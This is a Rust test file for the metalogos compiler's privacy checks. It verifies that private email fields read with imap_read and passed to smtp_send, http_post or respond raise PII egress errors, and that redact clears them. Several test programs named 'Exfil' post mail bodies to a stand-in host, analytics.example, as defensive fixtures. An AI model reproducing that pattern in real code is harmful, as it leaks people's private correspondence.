// ── tests/naryad_689_private_field_flow.rs ───────────────────────────
// №689 (gh#1256, wave 44; the R-1 finding): the FIRST flow-path check
// for the private field labels — «private-поле из imap_read → сток
// send_email/http_post» must be a LOUD label-contour event.
//
// The R-1 state before this naryad: the `private` mark lived on exactly
// ONE registry row (canary_check №661); imap_read carried all 9 fields
// `untrusted`; card_contacts/cal_events were bare `String`; and the
// FLOW engine (the №323 statement inference + the №325 sink gate) never
// read the registry field-meta — the audit's words: «the machine does
// not check the private → sink flow because there are almost no marks».
// The RED-first proof: the programs below COMPILED CLEAN (silent egress
// of the mail ПДн) before the registry marks + the №689 bridge.
//
// The repair, both halves in this one naryad (the audit's prescription):
//   1. the REGISTRY marks — the ImapEmail ПДн fields (from/to/subject/
//      body_text/body_html/attachments) are `private` (the shape read
//      off the impl, the №650 form; uid/date/seen stay untrusted — the
//      server metadata, not the correspondence content);
//   2. the BRIDGE — `semantic::registry_private_flow_label`: a row
//      whose field-meta carries `private` seeds the flow layer with the
//      type-layer secret projection (conf=private, integrity=trusted —
//      the ADR-0154 §2 form), so the №325 sink gate speaks the
//      PII_EGRESS_* classes on both the direct and the let-bound paths.
//
// The honest posture (documented, tested): the bridge is deliberately
// WHOLE-VALUE — a struct that contains private data flows as private
// (the fail-closed over-approximation; `email.uid` inherits the
// struct's conf the same way `expr_label(FieldAccess)` already
// inherits the object's label). The per-field precision needs the
// type-aware environment — the stage-2 contour, not this first tranche.
// The cure is the existing one: `redact` (the ONLY downward move,
// ADR-0136/№326) clears the egress — tested below.
#![allow(clippy::disallowed_methods)]

use metalogos::builtins::sig_types::Label;
use metalogos::builtins::BUILTIN_REGISTRY;

fn compile_errors(source: &str) -> Vec<String> {
    // The compile path = audit_category_a promotion (№98): parse + gate.
    match metalogos::compile_program(source) {
        Ok(_) => Vec::new(),
        Err(e) => e.lines().map(str::to_string).collect(),
    }
}

// ── The naryad scenario, red/green ───────────────────────────────────

#[test]
fn n689_imap_read_private_fields_into_smtp_send_are_loud() {
    let src = r#"
        pattern Exfil(uid: String) -> String {
            let email = imap_read(uid)
            let _ = smtp_send(email.from, email.subject, email.body_text)
            return "sent"
        }
    "#;
    let errs = compile_errors(src);
    assert!(
        errs.iter()
            .any(|m| m.contains("[PII_EGRESS_NETWORK]") || m.contains("[SECRET_EGRESS_NETWORK]")),
        "the mail ПДн (from/subject/body_text) into the smtp_send sink must be a LOUD egress event: {errs:?}"
    );
}

#[test]
fn n689_imap_read_private_fields_into_http_post_are_loud() {
    let src = r#"
        pattern Exfil(uid: String) -> String {
            let email = imap_read(uid)
            let _ = http_post("https://analytics.example/collect", email.body_text)
            return "sent"
        }
    "#;
    let errs = compile_errors(src);
    assert!(
        errs.iter()
            .any(|m| m.contains("[PII_EGRESS_NETWORK]") || m.contains("[SECRET_EGRESS_NETWORK]")),
        "the mail body into an outbound http_post must be a LOUD egress event: {errs:?}"
    );
}

#[test]
fn n689_imap_read_private_fields_into_respond_are_loud() {
    let src = r#"
        pattern Exfil(uid: String) -> String {
            let email = imap_read(uid)
            let _ = respond(email.body_text)
            return "ok"
        }
    "#;
    let errs = compile_errors(src);
    assert!(
        errs.iter().any(|m| m.contains("[PII_EGRESS_OUTPUT]")),
        "the mail body into the public output sink must be a LOUD PII event: {errs:?}"
    );
}

#[test]
fn n689_direct_call_path_is_loud_too() {
    // No let-binding: the direct nested call — the bridge fires on the
    // FnCall itself, not on the variable seeding only. (The postfix
    // `.field` on a call RESULT is not in the grammar today — the
    // parse error is the language boundary, recorded honestly; the
    // whole-struct argument is the expressible direct shape.)
    let src = r#"
        pattern Exfil(uid: String) -> String {
            let _ = http_post("https://analytics.example/collect", imap_read(uid))
            return "sent"
        }
    "#;
    let errs = compile_errors(src);
    assert!(
        errs.iter()
            .any(|m| m.contains("[PII_EGRESS_NETWORK]") || m.contains("[SECRET_EGRESS_NETWORK]")),
        "the direct imap_read(..) → http_post path must be loud: {errs:?}"
    );
    // The grammar boundary is pinned: the postfix form stays a PARSE
    // error (loud, not silent) until the language grows it.
    let postfix = r#"
        pattern Exfil(uid: String) -> String {
            let _ = smtp_send(imap_read(uid).from, "hi", "x")
            return "sent"
        }
    "#;
    let errs = compile_errors(postfix);
    assert!(
        errs.iter().any(|m| m.contains("parse error")),
        "the postfix field access on a call result is a grammar boundary — must stay loud"
    );
}

// ── The cures and the zero-delta controls ────────────────────────────

#[test]
fn n689_redact_is_the_downward_cure() {
    // The ONLY legal downward move (№326: the policy is a value; ADR-0136):
    // the redacted mail data egresses clean.
    let src = r#"
        pattern Notify(uid: String) -> String {
            let email = imap_read(uid)
            let _ = smtp_send(redact(email.from, "secrets"), "digest", "contact attempt logged")
            return "sent"
        }
    "#;
    let errs = compile_errors(src);
    assert!(
        !errs.iter().any(|m| m.contains("EGRESS")),
        "redact must cure the private conf before the egress (the №326 policy form): {errs:?}"
    );
}

#[test]
fn n689_plain_programs_stay_silent() {
    // The zero-delta control (the n325 (д) posture): no imap marks, no
    // new findings on the plain paths.
    let src = r#"
        pattern Plain() -> String {
            let _ = smtp_send("ops@example.com", "cron", "the nightly digest")
            return "ok"
        }
    "#;
    assert!(
        compile_errors(src).is_empty(),
        "the plain program must compile clean (zero delta)"
    );
}

// ── The registry marks themselves (the type-layer half) ─────────────

#[test]
fn n689_registry_marks_the_mail_pdn_private() {
    // The №650 form: the shape read off the impl. The ПДн fields are
    // private; the server metadata (uid/date/seen) stays untrusted.
    let spec = BUILTIN_REGISTRY
        .iter()
        .find(|s| s.name == "imap_read")
        .expect("imap_read is a registry row");
    let meta = metalogos::builtins::sig_types::parse_field_meta(spec.field_meta)
        .expect("imap_read carries a well-formed field-meta section");
    let label_of = |name: &str| {
        meta.iter()
            .find(|(f, _)| *f == name)
            .map(|(_, l)| *l)
            .unwrap_or_else(|| panic!("imap_read.{name} is missing from the field-meta"))
    };
    for field in [
        "from",
        "to",
        "subject",
        "body_text",
        "body_html",
        "attachments",
    ] {
        assert_eq!(
            label_of(field),
            Label::Private,
            "imap_read.{field} must carry the private mark (the ПДн class)"
        );
    }
    for field in ["uid", "date", "seen"] {
        assert_eq!(
            label_of(field),
            Label::Untrusted,
            "imap_read.{field} is the server metadata — untrusted, not ПДн"
        );
    }
}

#[test]
fn n689_contacts_calendar_honest_string_rows_documented() {
    // The honest №650 answer for the JSON-String returns (the naryad's
    // «либо типизация структуры, либо честная uns-строка с причиной —
    // молча не менять»): the live return is the JSON array STRING (the
    // contacts.rs/calendar.rs impls), the stage-0 scalar vocabulary
    // carries no label (from_path lifts the flat spellings only — a
    // `String<private>` row would erase to Unknown and REGRESS the
    // typed floor), so the row keeps the honest `String` spelling and
    // the REASON lives in the registry row comment. The machine-checkable
    // half of the honesty: the rows stay typed scalars (not silently
    // retyped) and the reason marker is grep-able in the registry.
    for name in ["card_contacts", "cal_events"] {
        let spec = BUILTIN_REGISTRY
            .iter()
            .find(|s| s.name == name)
            .unwrap_or_else(|| panic!("{name} is a registry row"));
        assert_eq!(
            spec.return_type,
            metalogos::builtins::sig_types::Type::String,
            "{name}: the live return is the JSON-String — the honest scalar stays"
        );
    }
    let registry_src = include_str!("../src/builtins/registry.rs");
    assert!(
        registry_src.contains("№689: the live return is the JSON array of contact structs"),
        "the card_contacts row must carry the honest №689 reason comment"
    );
    assert!(
        registry_src.contains("№689: the live return is the JSON array of event structs"),
        "the cal_events row must carry the honest №689 reason comment"
    );
}

// ── The bridge unit shape ────────────────────────────────────────────

#[test]
fn n689_bridge_fires_exactly_on_the_private_rows() {
    // The narrow bridge: rows WITHOUT a private mark stay on the old
    // (argument-propagation) path — the integrity bridging is
    // label_source's business, not this tranche's.
    for name in ["xml_parse", "geo_ip", "weather", "imap_list"] {
        let spec = BUILTIN_REGISTRY
            .iter()
            .find(|s| s.name == name)
            .unwrap_or_else(|| panic!("{name} is a registry row"));
        let carries_private = metalogos::builtins::sig_types::parse_field_meta(spec.field_meta)
            .map(|meta| {
                meta.iter()
                    .any(|(_, l)| matches!(l, metalogos::builtins::sig_types::Label::Private))
            })
            .unwrap_or(false);
        assert!(
            !carries_private,
            "{name} must stay OFF the №689 bridge (no private mark — the boundary fixture)"
        );
    }
}
